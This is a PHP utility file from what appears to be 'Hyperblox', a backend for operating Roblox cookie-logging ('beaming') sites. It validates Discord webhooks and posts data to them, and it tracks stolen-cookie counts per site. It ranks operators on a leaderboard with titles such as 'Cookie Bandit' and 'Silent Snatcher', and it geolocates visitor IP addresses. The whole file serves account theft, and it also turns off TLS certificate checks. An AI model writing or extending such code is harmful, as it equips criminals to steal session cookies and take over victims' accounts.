<?php
function generateToken($length = 32) {
    $base = 'HYPERBLOX';
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomPart = '';
    
    for ($i = 0; $i < $length - strlen($base); $i++) {
        $randomPart .= $characters[random_int(0, strlen($characters) - 1)];
    }
    
    $mixed = str_shuffle($base . $randomPart);
    return substr($mixed, 0, $length);
}

function makeRequest($url, $headers = [], $data = null, $method = 'GET') {
    $ch = curl_init($url);
    
    if ($method === 'POST' && $data !== null) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    return [
        'code' => $httpCode,
        'response' => $response,
        'error' => $error
    ];
}

function validateWebhook($webhookUrl) {
    if (!str_contains($webhookUrl, 'discord.com/api/webhooks/')) {
        return false;
    }
    
    $result = makeRequest($webhookUrl);
    
    if ($result['code'] !== 200) {
        return false;
    }
    
    $data = json_decode($result['response'], true);
    return isset($data['guild_id']) || isset($data['id']);
}

function sendWebhook($webhookUrl, $data) {
    $json = json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    return makeRequest($webhookUrl, ['Content-Type: application/json'], $json, 'POST');
}

function sanitizeDirectory($dir) {
    return preg_replace('/[^A-Za-z0-9_-]/', '', $dir);
}

function directoryExists($dir) {
    return file_exists(DATA_PATH . $dir);
}

function getInstanceData($dir) {
    $file = DATA_PATH . $dir . '/config.json';
    
    if (!file_exists($file)) {
        return null;
    }
    
    $data = file_get_contents($file);
    return json_decode($data, true);
}

function saveInstanceData($dir, $data) {
    $path = DATA_PATH . $dir;
    
    if (!file_exists($path)) {
        mkdir($path, 0777, true);
    }
    
    $file = $path . '/config.json';
    return file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
}

function getTokenData($token) {
    $file = TOKENS_PATH . $token . '.json';
    
    if (!file_exists($file)) {
        return null;
    }
    
    $data = file_get_contents($file);
    return json_decode($data, true);
}

function saveTokenData($token, $data) {
    if (!file_exists(TOKENS_PATH)) {
        mkdir(TOKENS_PATH, 0777, true);
    }
    
    $file = TOKENS_PATH . $token . '.json';
    return file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
}

function getGlobalStats() {
    $statsFile = DATA_PATH . '../stats.json';
    
    if (!file_exists($statsFile)) {
        return ['totalSites' => 0, 'totalCookies' => 0, 'lastUpdated' => time()];
    }
    
    $data = file_get_contents($statsFile);
    return json_decode($data, true);
}

function updateGlobalStats($field, $increment = 1) {
    $stats = getGlobalStats();
    $stats[$field] = ($stats[$field] ?? 0) + $increment;
    $stats['lastUpdated'] = time();
    
    $statsFile = DATA_PATH . '../stats.json';
    file_put_contents($statsFile, json_encode($stats, JSON_PRETTY_PRINT));
}

function getAllInstances() {
    $dirs = glob(DATA_PATH . '*', GLOB_ONLYDIR);
    $instances = [];
    
    foreach ($dirs as $dir) {
        $dirname = basename($dir);
        $data = getInstanceData($dirname);
        if ($data) {
            $data['directory'] = $dirname;
            $instances[] = $data;
        }
    }
    
    return $instances;
}

function getLeaderboard($limit = 5) {
    $instances = getAllInstances();
    
    usort($instances, function($a, $b) {
        return ($b['stats']['totalCookies'] ?? 0) - ($a['stats']['totalCookies'] ?? 0);
    });
    
    return array_slice($instances, 0, $limit);
}

function updateDailyStats($dir, $field, $value) {
    $instanceData = getInstanceData($dir);
    if (!$instanceData) return;
    
    $today = date('w');
    
    if (!isset($instanceData['dailyStats'][$field])) {
        $instanceData['dailyStats'][$field] = array_fill(0, 7, 0);
    }
    
    $instanceData['dailyStats'][$field][$today] += $value;
    
    saveInstanceData($dir, $instanceData);
}

function getRankInfo($logs) {
    $ranks = [
        ['min' => 0, 'max' => 2, 'name' => 'Noob Beamer'],
        ['min' => 3, 'max' => 9, 'name' => 'Rookie Logger'],
        ['min' => 10, 'max' => 25, 'name' => 'Script Kiddie'],
        ['min' => 26, 'max' => 49, 'name' => 'Amateur Beamer'],
        ['min' => 50, 'max' => 74, 'name' => 'Lowkey Harvester'],
        ['min' => 75, 'max' => 99, 'name' => 'Log Collector'],
        ['min' => 100, 'max' => 149, 'name' => 'Token Hunter'],
        ['min' => 150, 'max' => 199, 'name' => 'Cookie Bandit'],
        ['min' => 200, 'max' => 299, 'name' => 'Silent Snatcher'],
        ['min' => 300, 'max' => 399, 'name' => 'Seasoned Harvester'],
        ['min' => 400, 'max' => 499, 'name' => 'Digital Hijacker'],
        ['min' => 500, 'max' => 599, 'name' => 'Beam Technician'],
        ['min' => 600, 'max' => 699, 'name' => 'Advanced Extractor'],
        ['min' => 700, 'max' => 799, 'name' => 'Cyber Phantom'],
        ['min' => 800, 'max' => 899, 'name' => 'Professional Beamer'],
        ['min' => 900, 'max' => 999, 'name' => 'Ultimate Logger'],
        ['min' => 1000, 'max' => PHP_INT_MAX, 'name' => 'Hyperblox']
    ];
    
    $currentRank = 'Noob Beamer';
    $nextRank = 'Rookie Logger';
    $progress = 0;
    $logsToNextRank = 3;
    
    foreach ($ranks as $index => $rank) {
        if ($logs >= $rank['min'] && $logs <= $rank['max']) {
            $currentRank = $rank['name'];
            $nextRank = $ranks[$index + 1]['name'] ?? $currentRank;
            $rangeSize = $rank['max'] - $rank['min'];
            $progress = $rangeSize > 0 ? (($logs - $rank['min']) / $rangeSize) * 100 : 100;
            $logsToNextRank = $rank['max'] - $logs + 1;
            break;
        }
    }
    
    return [
        'currentRank' => $currentRank,
        'nextRank' => $nextRank,
        'progress' => round($progress, 2),
        'logsToNextRank' => max(0, $logsToNextRank)
    ];
}

function logActivity($message) {
    $logFile = __DIR__ . '/activity.log';
    $timestamp = date('Y-m-d H:i:s');
    $logMessage = "[{$timestamp}] {$message}\n";
    file_put_contents($logFile, $logMessage, FILE_APPEND);
}

function getClientIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ipaddress = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (isset($_SERVER['HTTP_X_REAL_IP'])) {
        $ipaddress = $_SERVER['HTTP_X_REAL_IP'];
    } elseif (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    }
    return $ipaddress;
}

function getCountryFromIP($ip = null) {
    if ($ip === null) {
        $ip = getClientIP();
    }
    
    $result = makeRequest("http://ip-api.com/json/{$ip}");
    
    if ($result['code'] === 200) {
        $data = json_decode($result['response'], true);
        return [
            'country' => $data['country'] ?? 'Unknown',
            'countryCode' => $data['countryCode'] ?? 'XX',
            'flag' => getCountryFlag($data['countryCode'] ?? 'XX')
        ];
    }
    
    return [
        'country' => 'Unknown',
        'countryCode' => 'XX',
        'flag' => '🌍'
    ];
}

function getCountryFlag($countryCode) {
    if (strlen($countryCode) !== 2) return '🌍';
    
    $code = strtoupper($countryCode);
    $firstLetter = mb_chr(ord($code[0]) - ord('A') + 0x1F1E6);
    $secondLetter = mb_chr(ord($code[1]) - ord('A') + 0x1F1E6);
    
    return $firstLetter . $secondLetter;
}
?>